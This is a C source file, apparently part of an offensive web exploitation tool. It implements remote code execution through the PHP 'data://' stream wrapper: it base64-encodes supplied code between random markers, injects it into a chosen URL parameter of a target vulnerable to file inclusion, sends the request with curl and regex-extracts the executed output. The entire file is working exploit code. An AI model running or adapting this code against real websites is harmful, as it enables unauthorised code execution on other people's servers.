#include "techniques/datawrap.h"
#include "request/request.h"
#include "string/concat.h"
#include "string/utils.h"
#include "string/base64.h"
#include "string/urlencode.h"
#include "regex/pcre.h"
#include "output.h"

char *datawrap_rce(url_t *url, const char *code, int pos){
	char *b64, *b64quoted, *wrap, *target, *ret = NULL,
		*regex, *aux, mark[8], **matches;

	request_t req;
	int len = 0;

	randomstr(mark, sizeof(mark));

	aux = concatl(mark, code, mark, NULL);
	regex = concatl(mark, "(.*)", mark, NULL);

	b64 = b64encode(aux, strlen(aux));
	b64quoted = urlencode(b64);
	free(b64);
	free(aux);

	wrap = concatl("data://text/plain;base64,", b64quoted, NULL);
	target = buildurl(url, string_replace, wrap, pos);
	free(wrap);
	free(b64quoted);

	request_init(&req);
	curl_easy_setopt(req.ch, CURLOPT_URL, target);
	free(target);

	if (request_exec(&req)) {
		goto end;
	}

	matches = regex_extract(&len, regex, req.body.ptr, req.body.len, PCRE_DOTALL);
	free(regex);

	if (len > 0) {
		ret = xstrdup(matches[0]);
		regex_free(matches, len);
	}

end:
	request_free(&req);
	return ret;
}

char *data_wrap_rce(const char *target, const char *parameter, const char *code)
{
	url_t url;
	char *rce = NULL;

	urlparser(&url, target);

	if (url.parameters) {
		for (int i = 0; i < url.plen; i++) {
			if (!strcmp(url.parameters[i].key, parameter)) {
				rce = datawrap_rce(&url, code, i);
				break;
			}
		}
	}

	urlfree(&url);
	return rce;
}
